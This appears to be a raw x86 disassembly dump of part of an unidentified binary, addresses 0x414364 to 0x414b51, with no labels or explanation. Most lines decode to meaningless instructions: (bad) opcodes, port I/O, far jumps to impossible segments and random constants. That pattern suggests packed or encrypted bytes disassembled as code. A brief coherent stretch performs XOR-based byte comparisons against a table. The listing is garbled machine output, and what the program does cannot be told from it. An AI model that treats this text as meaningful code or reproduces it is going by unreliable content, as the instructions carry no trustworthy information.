  414364:	leave  
  414365:	icebp  
  414366:	scas   al,BYTE PTR es:[edi]
  414367:	rcr    DWORD PTR [ebp-0x31],cl
  41436a:	faddp  st(3),st
  41436c:	mov    ?,WORD PTR [eax+0x26]
  41436f:	mov    eax,esi
  414371:	pop    ecx
  414372:	mov    ebp,0x97cbc7ef
  414377:	mov    eax,0x6f57532d
  41437c:	push   es
  41437d:	imul   eax,DWORD PTR [eax+ebx*2-0x42c31ab],0xfffffffa
  414385:	call   0xe4542c8c
  41438a:	sub    BYTE PTR [esi],dl
  41438c:	push   edi
  41438d:	aad    0x6e
  41438f:	mov    ch,0xe5
  414391:	lahf   
  414392:	dec    eax
  414393:	xor    al,0x9d
  414395:	aam    0xd
  414397:	push   edi
  414398:	push   edi
  414399:	sub    al,0x25
  41439b:	pusha  
  41439c:	(bad)  
  41439d:	sub    al,0xf1
  41439f:	adc    edx,DWORD PTR [edi-0x1ddbb11f]
  4143a5:	push   esi
  4143a6:	push   ds
  4143a7:	pop    esi
  4143a8:	inc    esp
  4143a9:	mov    edi,0x61c4ff8a
  4143ae:	sub    edi,ecx
  4143b0:	xchg   ecx,eax
  4143b1:	xchg   ebp,eax
  4143b2:	mov    al,0x99
  4143b4:	je     0x4143db
  4143b6:	bound  edi,QWORD PTR [edi]
  4143b8:	int3   
  4143b9:	fnsave [edi-0xe3d5ef]
  4143bf:	gs inc ebx
  4143c1:	in     eax,0xb1
  4143c3:	mov    esi,0x353207c2
  4143c8:	sbb    al,0x5d
  4143ca:	or     al,0xbd
  4143cc:	(bad)  
  4143ce:	ins    DWORD PTR es:[edi],dx
  4143cf:	sbb    al,0xda
  4143d1:	les    esp,FWORD PTR [ebx+0x37aa8205]
  4143d7:	leave  
  4143d8:	push   edi
  4143d9:	or     esp,DWORD PTR [esi]
  4143db:	mov    DWORD PTR [edi-0x5],ebp
  4143de:	cmp    eax,0x4200201b
  4143e3:	push   ebx
  4143e4:	add    edx,DWORD PTR ss:[ecx+0x4037ad25]
  4143eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143ec:	cld    
  4143ed:	inc    esi
  4143ee:	jecxz  0x4143b7
  4143f0:	sub    eax,0xe003dc00
  4143f5:	cmp    eax,0x63798dcb
  4143fa:	inc    ecx
  4143fb:	adc    BYTE PTR [edi],ch
  4143fd:	sub    BYTE PTR [ecx+eiz*1-0x781605f8],cl
  414404:	mov    eax,gs:0x8b23c735
  41440a:	inc    esi
  41440b:	mov    al,0x9c
  41440d:	dec    esp
  41440e:	jae    0x414468
  414410:	xor    eax,0x9f49f13a
  414415:	or     DWORD PTR [ecx],edi
  414417:	mov    al,0x3e
  414419:	in     al,dx
  41441a:	data16 mov cl,0x4f
  41441d:	inc    ebx
  41441e:	cmp    dh,dh
  414420:	clc    
  414421:	(bad)  
  414422:	(bad)  
  414423:	ret    
  414424:	repnz icebp 
  414426:	in     eax,dx
  414427:	mov    BYTE PTR [ebx],dl
  414429:	inc    edi
  41442a:	data16 daa 
  41442c:	iret   
  41442d:	dec    ecx
  41442e:	(bad)  
  414430:	(bad)  
  414431:	cmp    ecx,DWORD PTR [edx]
  414433:	test   al,0x61
  414435:	(bad)  
  414436:	fdiv   QWORD PTR [ebp-0x6a]
  414439:	cmp    al,0xc3
  41443b:	js     0x414496
  41443d:	cli    
  41443e:	sbb    BYTE PTR [eax+0x3f2faf9],bh
  414444:	jecxz  0x4144a1
  414446:	dec    ebx
  414447:	push   esi
  414448:	popf   
  414449:	repnz jecxz 0x414425
  41444c:	ds loop 0x414453
  41444f:	es (bad) 
  414452:	fisttp WORD PTR [ebx+ecx*2-0xd]
  414456:	or     esp,ebp
  414458:	enter  0x6a79,0xeb
  41445c:	enter  0xc80,0xd7
  414460:	cmp    al,0x5f
  414462:	push   0xffffff9f
  414464:	scas   al,BYTE PTR es:[edi]
  414465:	call   0xf486a12a
  41446a:	lock fucomi st,st(4)
  41446d:	sbb    DWORD PTR [edi-0x2],0xdda6b506
  414474:	inc    edi
  414476:	jmp    0x7cd7:0x40d8e30c
  41447d:	mov    ebx,0xc36844e0
  414482:	xor    bl,BYTE PTR [ebp-0x3a]
  414485:	cdq    
  414486:	mov    ah,BYTE PTR [esi]
  414488:	bound  esi,QWORD PTR [ecx+edi*2-0x58]
  41448c:	or     eax,0x610e5912
  414491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414492:	mov    bl,0xce
  414494:	jns    0x414431
  414496:	jp     0x414428
  414498:	sbb    dl,0xa3
  41449b:	fmul   DWORD PTR [ebx+0x773c4b5e]
  4144a1:	push   ecx
  4144a2:	add    BYTE PTR [eax+eax*8+0x376b4838],al
  4144a9:	mov    dl,0xa8
  4144ab:	sar    BYTE PTR [eax+0x741c7c3d],1
  4144b1:	sub    al,0x12
  4144b3:	adc    ecx,DWORD PTR [edx+0xa]
  4144b6:	and    eax,0x32549fb0
  4144bb:	pop    ds
  4144bc:	dec    ebx
  4144bd:	jo     0x414470
  4144bf:	push   cs
  4144c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144c1:	adc    ch,0x6e
  4144c4:	rcr    DWORD PTR [edx],1
  4144c6:	in     eax,dx
  4144c7:	rol    BYTE PTR [ebx],1
  4144c9:	fmul   QWORD PTR [ecx+0x34923ecd]
  4144cf:	(bad)  
  4144d0:	ja     0x4144ad
  4144d2:	sub    al,0x4c
  4144d4:	xor    BYTE PTR [eax],bl
  4144d6:	dec    edi
  4144d7:	data16 out dx,al
  4144d9:	dec    eax
  4144da:	pop    ebx
  4144db:	pop    edi
  4144dc:	cmp    ch,0xd2
  4144df:	jg     0x41454b
  4144e1:	mov    ds:0x7da939dc,eax
  4144e6:	adc    eax,0xeb044478
  4144eb:	xchg   edi,eax
  4144ec:	int    0x0
  4144ee:	sbb    edx,eax
  4144f0:	mov    ecx,0x847d4ed8
  4144f5:	push   ebx
  4144f6:	hlt    
  4144f7:	sub    eax,0x68126668
  4144fc:	or     ebx,ecx
  4144fe:	mov    ch,0x34
  414500:	imul   eax,DWORD PTR [ecx-0x7c3d95de],0x6dd50890
  41450a:	fisttp DWORD PTR [ebx+0x20]
  41450d:	or     BYTE PTR [ecx],ah
  41450f:	fdivr  DWORD PTR [eax-0x4ba74254]
  414515:	pop    edi
  414516:	adc    ah,BYTE PTR [ebp-0xc]
  414519:	lods   al,BYTE PTR ds:[esi]
  41451a:	lods   al,BYTE PTR ds:[esi]
  41451b:	inc    edi
  41451c:	pop    ds
  41451d:	push   ecx
  41451e:	pop    edx
  41451f:	dec    esi
  414520:	and    eax,0x5f56d224
  414525:	nop
  414526:	stos   BYTE PTR es:[edi],al
  414527:	call   0x3616:0xf3c7ecd6
  41452e:	and    eax,0xb08e7d64
  414533:	jp     0x4144d4
  414535:	call   0xcca74d96
  41453a:	mov    ds,WORD PTR [eax+0x417dc056]
  414540:	test   BYTE PTR ds:0x44fd6ae5,cl
  414546:	dec    eax
  414547:	or     al,0x27
  414549:	aaa    
  41454a:	fs scas eax,DWORD PTR es:[edi]
  41454c:	cdq    
  41454d:	push   ecx
  41454e:	mov    esp,0xa58e47b1
  414553:	adc    al,dl
  414555:	and    BYTE PTR [edi-0x48],ah
  414558:	jp     0x41453a
  41455a:	xor    di,WORD PTR [edx-0x257e0152]
  414561:	out    0x13,eax
  414563:	es inc ebx
  414565:	push   edx
  414566:	mov    cs,WORD PTR [eax+eiz*8+0x15d5c07]
  41456d:	dec    edi
  41456e:	cs jecxz 0x4145b7
  414571:	retf   
  414572:	cmp    BYTE PTR [edi],bh
  414574:	jg     0x414562
  414576:	adc    cl,ah
  414578:	js     0x414578
  41457a:	push   ebx
  41457b:	ja     0x414509
  41457d:	hlt    
  41457e:	and    eax,0x670a5ca5
  414583:	fcom   st(6)
  414586:	das    
  414587:	mov    al,ds:0x15d63d0b
  41458c:	repz jne 0x41453d
  41458f:	pop    edx
  414590:	in     eax,0xbd
  414592:	imul   esi,DWORD PTR [edi+eiz*4],0xffffffc9
  414596:	repnz movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  414599:	not    BYTE PTR [edx-0x5dd9cbe4]
  41459f:	or     BYTE PTR [eax+0x0],ch
  4145a2:	cdq    
  4145a3:	mov    ah,0xb5
  4145a5:	rcl    BYTE PTR [edi],0xe3
  4145a8:	pop    esi
  4145a9:	cmc    
  4145aa:	mov    cl,0x66
  4145ac:	inc    edx
  4145ad:	(bad)  
  4145ae:	fnstenv [esi]
  4145b0:	mov    dl,0x54
  4145b2:	and    BYTE PTR [eax+0x463bbe29],ah
  4145b8:	adc    esp,DWORD PTR [ebp-0x687fa4de]
  4145be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145bf:	data16 stos BYTE PTR es:[edi],al
  4145c1:	in     eax,0x4d
  4145c3:	in     eax,0x34
  4145c5:	mov    eax,0x310fc80d
  4145ca:	xchg   BYTE PTR [edx-0x9],dh
  4145cd:	cmp    edi,DWORD PTR [eax-0x38]
  4145d0:	push   edi
  4145d1:	mov    dh,0x67
  4145d3:	add    BYTE PTR [esi+edx*4-0x4a7133be],0x79
  4145db:	dec    esp
  4145dc:	push   0x2e31334d
  4145e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145e2:	cmp    DWORD PTR [ecx-0x4f],ecx
  4145e5:	pop    esi
  4145e6:	add    bh,BYTE PTR [edx-0x21]
  4145e9:	pop    ecx
  4145ea:	std    
  4145eb:	mov    dh,0x7e
  4145ed:	mov    dh,0x9a
  4145ef:	adc    eax,DWORD PTR [ebx+0x5ac0b582]
  4145f5:	dec    ebx
  4145f6:	mov    eax,0x2d705ad0
  4145fb:	mov    cl,0xdf
  4145fd:	outs   dx,BYTE PTR ds:[esi]
  4145fe:	ja     0x4145e8
  414600:	into   
  414601:	jl     0x41461e
  414603:	mov    esp,0x471fb233
  414608:	push   0xffffffa5
  41460a:	jg     0x4145aa
  41460c:	sub    al,al
  41460e:	data16 and al,0x9e
  414611:	(bad)  
  414612:	test   esp,ebx
  414614:	lods   eax,DWORD PTR ds:[esi]
  414615:	xchg   esp,eax
  414616:	sub    al,0xe8
  414618:	add    eax,0x9ecc696d
  41461d:	push   0x843a3304
  414622:	jo     0x41461a
  414624:	mov    ebx,0x56acb25f
  414629:	add    edi,DWORD PTR [ebp-0x50379923]
  41462f:	test   al,0x58
  414631:	sbb    al,0xb3
  414633:	bnd fs jb 0x4145cd
  414637:	fcom   QWORD PTR [ecx-0x17]
  41463a:	cmp    DWORD PTR [ebx],ebp
  41463c:	scas   al,BYTE PTR es:[edi]
  41463d:	jb     0x414666
  41463f:	mov    eax,0xcade93d0
  414644:	in     eax,dx
  414645:	pop    ebx
  414646:	retf   0x9276
  414649:	sbb    al,0x64
  41464b:	das    
  41464c:	test   BYTE PTR [edi+0x3ae40f39],ah
  414652:	inc    ebx
  414653:	xchg   edx,eax
  414654:	stos   BYTE PTR es:[edi],al
  414655:	out    dx,eax
  414656:	push   DWORD PTR [edx+0x34]
  414659:	test   BYTE PTR [esi-0x6d],ah
  41465c:	inc    ebp
  41465d:	lods   al,BYTE PTR ds:[esi]
  41465e:	arpl   WORD PTR [esi+0x7b],si
  414661:	jecxz  0x41460d
  414663:	lahf   
  414664:	push   ecx
  414665:	into   
  414666:	xchg   edi,esp
  414668:	out    dx,al
  414669:	cs add eax,0x9c6ddb9
  41466f:	inc    BYTE PTR [edx-0x57]
  414672:	push   0x43
  414674:	xlat   BYTE PTR ds:[ebx]
  414675:	arpl   bp,di
  414677:	es mov esi,0x1a3f613a
  41467d:	jecxz  0x4146dd
  41467f:	xor    DWORD PTR [esi-0x43a1ac20],edi
  414685:	xchg   ebp,eax
  414686:	stc    
  414687:	pop    edx
  414688:	mov    bl,BYTE PTR [eax*8+0xb4c6c22]
  41468f:	pop    ss
  414690:	lods   eax,DWORD PTR ds:[esi]
  414691:	outs   dx,BYTE PTR ds:[esi]
  414692:	jno    0x41463c
  414694:	push   edi
  414695:	dec    ebp
  414696:	mov    cs,ecx
  414698:	inc    ecx
  414699:	pop    ds
  41469a:	std    
  41469b:	xchg   edx,eax
  41469c:	cmp    eax,0xdb68a67c
  4146a1:	mov    ecx,0x44d6a0bf
  4146a6:	fcmovu st,st(3)
  4146a8:	jecxz  0x4146f6
  4146aa:	jmp    edx
  4146ac:	pop    eax
  4146ad:	dec    eax
  4146ae:	rcl    BYTE PTR [esi-0x1c],cl
  4146b1:	fstp   st(1)
  4146b3:	lods   eax,DWORD PTR ds:[esi]
  4146b4:	and    bl,BYTE PTR [esp+eiz*8]
  4146b7:	xor    eax,0x51acf3bc
  4146bc:	test   esp,edi
  4146be:	outs   dx,BYTE PTR ds:[esi]
  4146bf:	ficom  DWORD PTR [esi+0x352627a8]
  4146c5:	in     al,0xae
  4146c7:	retf   0x9abb
  4146ca:	dec    eax
  4146cb:	mov    ebp,0x5155e50
  4146d0:	aas    
  4146d1:	fnclex 
  4146d3:	sub    DWORD PTR [edx+0x6e753713],ecx
  4146d9:	(bad)  
  4146da:	mov    edi,0x42b6ad9d
  4146df:	rcr    BYTE PTR [ebx+0x46310cec],0x9
  4146e6:	outs   dx,BYTE PTR ds:[esi]
  4146e7:	sbb    al,0x54
  4146e9:	and    ecx,esp
  4146eb:	adc    eax,0x234949ac
  4146f0:	inc    esp
  4146f1:	test   eax,0x189bb3ff
  4146f6:	pop    ds
  4146f7:	add    al,0x4d
  4146f9:	fmul   DWORD PTR [eax-0x66]
  4146fc:	call   0x13e3d9c9
  414701:	xor    dl,cl
  414703:	or     al,0xf3
  414705:	pop    eax
  414706:	repz mov dh,0x86
  414709:	test   DWORD PTR [eax-0x7e64e417],ecx
  41470f:	je     0x41475e
  414711:	data16 shr BYTE PTR [edi-0x398715e6],1
  414718:	pop    ds
  414719:	mov    ch,0x4
  41471b:	push   ecx
  41471c:	mov    dh,0x35
  41471e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41471f:	mov    eax,DWORD PTR [eax-0x5a]
  414722:	in     eax,0x9d
  414724:	stos   BYTE PTR es:[edi],al
  414725:	mov    al,0x1a
  414727:	or     BYTE PTR [edx+eiz*1+0x36a91ebc],cl
  41472e:	add    dl,ch
  414730:	gs xchg ebp,eax
  414732:	xor    eax,DWORD PTR ds:0x67e1a09
  414738:	and    BYTE PTR [ebx],ah
  41473a:	hlt    
  41473b:	loopne 0x414717
  41473d:	scas   al,BYTE PTR es:[edi]
  41473e:	call   0xd6b48679
  414743:	frstor [esi]
  414745:	jecxz  0x4147ba
  414747:	mov    cl,0x85
  414749:	mov    ds:0x18a2fdea,al
  41474e:	gs (bad) 
  414750:	pop    es
  414751:	jmp    0x3d81cba2
  414756:	and    ah,BYTE PTR [edx+ebx*4]
  414759:	jns    0x414703
  41475b:	push   ss
  41475c:	pop    ebx
  41475d:	enter  0x961d,0x5b
  414761:	and    BYTE PTR [ebp+0x5],dh
  414764:	arpl   WORD PTR [ebp-0x40fb8ba3],si
  41476a:	in     eax,dx
  41476b:	mov    BYTE PTR [edi+0x4],ch
  41476e:	ret    
  41476f:	out    dx,al
  414770:	inc    ecx
  414771:	pop    ecx
  414772:	cli    
  414773:	adc    DWORD PTR [edx],edi
  414775:	shr    DWORD PTR ds:0x954a6871,1
  41477b:	out    0x9d,al
  41477d:	or     eax,0xb2ccec7b
  414782:	or     edx,esi
  414784:	jno    0x4147a6
  414786:	push   ss
  414787:	inc    ebx
  414788:	arpl   bx,ax
  41478a:	icebp  
  41478b:	jmp    FWORD PTR [edx+0x40]
  41478e:	mov    dh,0x4f
  414790:	xor    BYTE PTR [edi],bh
  414792:	scas   eax,DWORD PTR es:[edi]
  414793:	sar    DWORD PTR [ebp-0x67],0x9f
  414797:	mov    al,ds:0x7aa1bbfb
  41479c:	mov    al,0x76
  41479e:	cdq    
  41479f:	sub    DWORD PTR [edi+0x3a6e4d21],ebp
  4147a5:	push   0xb65e1748
  4147aa:	adc    ebx,DWORD PTR [edx+eiz*4+0x8ca6928]
  4147b1:	rcr    ebp,cl
  4147b3:	cmp    eax,0xe9831504
  4147b8:	adc    BYTE PTR [edi-0x68],ch
  4147bb:	rcr    DWORD PTR [esi+edi*4],1
  4147be:	mov    WORD PTR [eax+ebp*4],es
  4147c1:	stc    
  4147c2:	xor    bl,BYTE PTR [edx]
  4147c4:	sub    DWORD PTR [edi-0x66ec972a],ebx
  4147ca:	(bad)
  4147cd:	sbb    eax,0xcb51b4f7
  4147d2:	out    0x67,eax
  4147d4:	idiv   DWORD PTR ds:0xcb51a667
  4147da:	call   0xa5ca29d5
  4147df:	mov    ebx,0x1ece1977
  4147e4:	outs   dx,DWORD PTR ds:[esi]
  4147e5:	inc    esi
  4147e6:	jge    0x414771
  4147e8:	adc    DWORD PTR [ebx-0x37],ebp
  4147eb:	mov    DWORD PTR [edx+0x63],edi
  4147ee:	jmp    0x2b3f:0xca628e82
  4147f5:	mov    edx,eax
  4147f7:	xchg   esi,eax
  4147f8:	fcom   DWORD PTR [ebx+0x563e7201]
  4147fe:	fs in  al,dx
  414800:	cmp    DWORD PTR [eax+eiz*4+0x3b],edi
  414804:	outs   dx,BYTE PTR ds:[esi]
  414805:	sbb    ch,BYTE PTR [ebx+esi*2-0x6d]
  414809:	xchg   edi,eax
  41480a:	mov    ch,0xbd
  41480c:	or     eax,0xa8f17ac4
  414811:	(bad)  
  414812:	mov    ch,0xaf
  414814:	into   
  414815:	stos   BYTE PTR es:[edi],al
  414816:	mov    al,0x84
  414818:	jecxz  0x414898
  41481a:	(bad)  
  41481b:	xchg   ecx,eax
  41481c:	cli    
  41481d:	fwait
  41481e:	repnz cwde 
  414820:	stos   DWORD PTR es:[edi],eax
  414821:	dec    eax
  414822:	sbb    al,0x9f
  414824:	fwait
  414825:	push   edx
  414826:	das    
  414827:	or     dl,BYTE PTR [eax]
  414829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41482a:	or     DWORD PTR [edx+0x5bc00a6],edx
  414830:	push   eax
  414831:	icebp  
  414832:	fisub  DWORD PTR [eax]
  414834:	mov    dl,0x17
  414836:	fcmovne st,st(7)
  414838:	mov    BYTE PTR [edi],bl
  41483a:	ret    0xd1c2
  41483d:	rep lods al,BYTE PTR ds:[esi]
  41483f:	inc    edi
  414840:	test   eax,0xfb03027
  414845:	pop    esi
  414846:	mov    ds:0x9679d821,al
  41484b:	aad    0x8a
  41484d:	cli    
  41484e:	mul    edx
  414850:	je     0x4148ba
  414852:	arpl   WORD PTR [ecx-0x10],di
  414855:	idiv   DWORD PTR [esi+0x64aaeeb1]
  41485b:	push   0xf4af864b
  414860:	ins    DWORD PTR es:[di],dx
  414862:	push   es
  414863:	mov    WORD PTR [ecx-0x14a6d8fb],?
  414869:	popf   
  41486a:	outs   dx,BYTE PTR ds:[esi]
  41486b:	scas   al,BYTE PTR es:[edi]
  41486c:	lds    eax,FWORD PTR [edx-0x54b6bc5]
  414872:	fistp  QWORD PTR [edx]
  414874:	cvtps2pi mm6,QWORD PTR [eax+0x740403f6]
  41487b:	adc    BYTE PTR [ebx],dl
  41487d:	mov    dl,0x54
  41487f:	push   edx
  414880:	xchg   esp,eax
  414881:	inc    eax
  414882:	(bad)  
  414883:	pop    bx
  414885:	xor    al,0x40
  414887:	repz int 0x10
  41488a:	shl    WORD PTR [esi-0x271f2de9],1
  414891:	adc    eax,DWORD PTR [edi-0x7a]
  414894:	ret    
  414895:	ins    DWORD PTR es:[edi],dx
  414896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414897:	das    
  414898:	lea    esp,[edx-0x582b937f]
  41489e:	add    eax,0x4b4f73fb
  4148a3:	scas   eax,DWORD PTR es:[edi]
  4148a4:	sbb    dl,BYTE PTR [esi+0x23]
  4148a7:	pop    edi
  4148a8:	adc    ecx,DWORD PTR [esi-0x6776ae0]
  4148ae:	xor    bh,BYTE PTR [eax-0x30]
  4148b1:	sbb    eax,0xf08e282e
  4148b6:	hlt    
  4148b7:	pushf  
  4148b8:	fs cmp al,0x2d
  4148bb:	sub    al,0x84
  4148bd:	sbb    BYTE PTR [edi],ch
  4148bf:	ficomp WORD PTR [edx]
  4148c1:	mov    eax,0xec23d14e
  4148c6:	push   edx
  4148c7:	mov    eax,ds:0xe84b7c4e
  4148cc:	mov    es,WORD PTR [esi+0x0]
  4148cf:	rol    DWORD PTR ds:0xb4b5c714,cl
  4148d5:	scas   eax,DWORD PTR es:[edi]
  4148d6:	ret    0x7360
  4148d9:	lods   eax,DWORD PTR ds:[esi]
  4148da:	xchg   esi,eax
  4148db:	addr16 pop esp
  4148dd:	lea    edi,[edx+0x38538c37]
  4148e3:	jle    0x414962
  4148e5:	test   BYTE PTR [ecx],bh
  4148e7:	mov    ebp,0x9694f299
  4148ec:	(bad)  
  4148ed:	cmovs  edi,eax
  4148f0:	and    BYTE PTR [esi],dh
  4148f2:	popf   
  4148f3:	xor    al,0x95
  4148f5:	sbb    al,0xe
  4148f7:	loopne 0x41489c
  4148f9:	xor    eax,0xdee24f5e
  4148fe:	jns    0x4148de
  414900:	sti    
  414901:	xchg   esp,eax
  414902:	mov    eax,0xb7082564
  414907:	add    eax,0xe48699fc
  41490c:	aas    
  41490d:	loop   0x4148e7
  41490f:	in     eax,0x8b
  414911:	push   ebp
  414912:	hlt    
  414913:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    ch,BYTE PTR [edi-0x1c]
  414991:	adc    eax,0x7a944e45
  414996:	jnp    0x414949
  414998:	pushf  
  414999:	jnp    0x414a16
  41499b:	ins    BYTE PTR es:[edi],dx
  41499c:	or     esi,DWORD PTR [ebx+0x36]
  41499f:	cmp    DWORD PTR [eax-0x675e50a2],ebp
  4149a5:	cs jmp 0x5711:0x67241407
  4149ad:	fsub   DWORD PTR [ebx]
  4149af:	mov    ecx,DWORD PTR [edi+0x1a]
  4149b2:	adc    BYTE PTR [ebx-0x3f0fe787],al
  4149b8:	mov    ah,0x96
  4149ba:	push   ebp
  4149bb:	mov    dh,0x4
  4149bd:	std    
  4149be:	test   BYTE PTR [ebp-0x55],dh
  4149c1:	aaa    
  4149c2:	pop    ebx
  4149c3:	cdq    
  4149c4:	(bad)  
  4149c5:	push   esi
  4149c6:	out    0x78,al
  4149c8:	push   esp
  4149c9:	je     0x4149a9
  4149cb:	sub    edx,DWORD PTR ds:0xcd472014
  4149d1:	mov    esi,0x4e0134db
  4149d6:	aad    0x37
  4149d8:	ins    DWORD PTR es:[edi],dx
  4149d9:	int    0xfd
  4149db:	sti    
  4149dc:	lds    eax,FWORD PTR [esi-0x754c08a9]
  4149e2:	pop    esp
  4149e3:	cmp    edx,ecx
  4149e5:	xlat   BYTE PTR ds:[ebx]
  4149e6:	mov    ebp,0x3366f066
  4149eb:	ret    
  4149ec:	ffree  st(1)
  4149ee:	gs pop esp
  4149f0:	or     BYTE PTR [edx],cl
  4149f2:	jg     0x4149ef
  4149f4:	pop    esi
  4149f5:	mov    edi,0x5ffe4116
  4149fa:	ss add al,0x55
  4149fd:	xchg   edx,eax
  4149fe:	lods   eax,DWORD PTR ds:[esi]
  4149ff:	fwait
  414a00:	mov    eax,0x830ae77c
  414a05:	inc    BYTE PTR [edx+0x6014246c]
  414a0b:	clc    
  414a0c:	repz ds xchg ebx,eax
  414a0f:	les    edx,FWORD PTR [ecx-0x7a]
  414a12:	mov    bh,0xf5
  414a14:	out    dx,al
  414a15:	mov    BYTE PTR [edx],cl
  414a17:	sub    eax,0xbdf14ca9
  414a1c:	cmp    BYTE PTR [eax+0xba599d0],cl
  414a22:	(bad)  
  414a23:	out    0x70,al
  414a25:	mov    BYTE PTR [eax],0x91
  414a28:	dec    ecx
  414a29:	jnp    0x414a6b
  414a2b:	mov    esi,DWORD PTR [ebp-0x1cec2dd5]
  414a31:	cs jmp 0xa54c:0x2e3e9c84
  414a39:	js     0x414a44
  414a3b:	pop    ds
  414a3c:	pop    ds
  414a3d:	jne    0x414a9a
  414a3f:	fwait
  414a40:	(bad)  
  414a41:	arpl   WORD PTR [edi],ax
  414a43:	xchg   DWORD PTR [ebx+0x35959d8a],edx
  414a49:	jle    0x4149ef
  414a4b:	pop    ecx
  414a4c:	das    
  414a4d:	add    al,0x9
  414a4f:	shl    DWORD PTR ds:0xe478f940,1
  414a55:	or     BYTE PTR [eax-0x8],cl
  414a58:	sub    DWORD PTR [ecx],ebx
  414a5a:	add    DWORD PTR [edx-0x7b6497b1],edx
  414a60:	jl     0x414a9d
  414a62:	loope  0x414a1a
  414a64:	retf   
  414a65:	stc    
  414a66:	add    ebx,ecx
  414a68:	lea    edi,[ecx+0x4c]
  414a6b:	push   es
  414a6c:	pusha  
  414a6d:	iret   
  414a6e:	sub    ecx,DWORD PTR [ebp+0x446705e0]
  414a74:	aad    0x55
  414a76:	inc    esi
  414a77:	inc    edx
  414a78:	arpl   bp,cx
  414a7a:	dec    eax
  414a7b:	daa    
  414a7c:	cmp    al,0x42
  414a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a7f:	aam    0xf7
  414a81:	aaa    
  414a82:	xor    bl,BYTE PTR [ebx+0xc]
  414a85:	xor    ecx,esp
  414a87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a88:	mov    dh,0x59
  414a8a:	call   0xae203c34
  414a8f:	hlt    
  414a90:	fld1   
  414a92:	xchg   esi,eax
  414a93:	es xchg edx,eax
  414a95:	cmp    eax,DWORD PTR [eax+ebp*1]
  414a98:	xlat   BYTE PTR ds:[ebx]
  414a99:	test   al,0xc7
  414a9b:	shl    BYTE PTR [ebx+0x14a1b31c],0x68
  414aa2:	out    dx,al
  414aa3:	push   ds
  414aa4:	add    edi,eax
  414aa6:	out    0x6c,eax
  414aa8:	xchg   esp,eax
  414aa9:	icebp  
  414aaa:	and    eax,0x740b621e
  414aaf:	push   ds
  414ab0:	xchg   esp,eax
  414ab1:	fidivr WORD PTR ds:0x2d56dcc6
  414ab7:	sbb    eax,0xea22ff87
  414abc:	int3   
  414abd:	sub    eax,0xf76cc785
  414ac2:	scas   eax,DWORD PTR es:[edi]
  414ac3:	mov    ds:0xe31334b7,eax
  414ac8:	ss in  al,0x9
  414acb:	cld    
  414acc:	arpl   di,si
  414ace:	shr    DWORD PTR [edi-0x6f],0x58
  414ad2:	cmc    
  414ad3:	leave  
  414ad4:	stc    
  414ad5:	pop    ecx
  414ad6:	lock out 0x3f,eax
  414ad9:	mov    dl,0xea
  414adb:	mov    esp,0x61047dc
  414ae0:	pop    eax
  414ae1:	in     eax,dx
  414ae2:	jg     0x414b4a
  414ae4:	dec    edi
  414ae5:	xlat   BYTE PTR ds:[ebx]
  414ae6:	das    
  414ae7:	dec    esi
  414ae8:	lea    edx,[ebx+0x1242de4f]
  414aee:	fisub  WORD PTR [ebp-0x49]
  414af1:	int3   
  414af2:	inc    esp
  414af3:	sub    ecx,esi
  414af5:	jge    0x414af3
  414af7:	dec    edx
  414af8:	repnz jmp 0xde18:0x89fb2bf3
  414b00:	mul    DWORD PTR [ebx-0x8f5809a]
  414b06:	add    BYTE PTR [edx+0x34],0xb9
  414b0a:	popa   
  414b0b:	mov    ds:0x22c53907,al
  414b10:	cld    
  414b11:	pop    ebx
  414b12:	mov    ebx,0x91c7c6be
  414b17:	hlt    
  414b18:	inc    ebx
  414b19:	ss lahf 
  414b1b:	in     al,0x34
  414b1d:	fistp  DWORD PTR [edx-0x2c]
  414b20:	imul   ebx,ecx,0x1f8738b1
  414b26:	jno    0x414b1b
  414b28:	sbb    al,0xa2
  414b2a:	fcom   DWORD PTR [ebx+ecx*2]
  414b2d:	call   0x2511bf32
  414b32:	sar    BYTE PTR [ecx+0x48],1
  414b35:	sbb    esp,edi
  414b37:	js     0x414b83
  414b39:	xchg   BYTE PTR [ebx+0x64c393bd],al
  414b3f:	cmp    edi,DWORD PTR [edi+0x3c109159]
  414b45:	loope  0x414ad9
  414b47:	mov    WORD PTR [esi],?
  414b49:	pop    ss
  414b4a:	pop    ebp
  414b4b:	xchg   dh,dh
  414b4d:	dec    edx
  414b4e:	sahf   
  414b4f:	inc    esi
  414b50:	pop    ds
  414b51:	imul   eax,DWORD PTR [ebx-0x73],0xffffffc5
